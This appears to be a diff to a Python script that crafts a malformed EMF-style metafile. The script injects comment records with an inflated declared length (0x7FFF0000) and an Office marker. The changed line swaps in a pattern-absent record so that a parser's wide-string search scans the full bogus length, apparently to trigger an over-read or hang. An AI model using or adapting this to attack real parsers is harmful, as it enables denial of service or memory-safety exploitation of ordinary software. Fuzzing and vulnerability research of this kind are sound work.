@@ -60,7 +60,8 @@ def patch(path_in, path_out, stress=0x7FFF0000):
         raise RuntimeError('no EOF record')
     pos = eof[-1][0]
     inj = build_comment(stress, (b'msOZMSOFFICE9.0' + b'\x00' * 5).ljust(20, b'\x00'))
-    inj += build_comment(stress, b'I\x00c\x00o\x00n\x00O\x00n\x00l\x00y\x00' + b'\x00' * 4)
+    # pattern-absent record: forces the wide search to scan the full declared length
+    inj += build_comment(stress, b'X\x00' * 10)
     d[pos:pos] = inj
     nb, nr = struct.unpack_from('<II', d, 0x30)
     struct.pack_into('<II', d, 0x30, nb + len(inj), nr + 2)
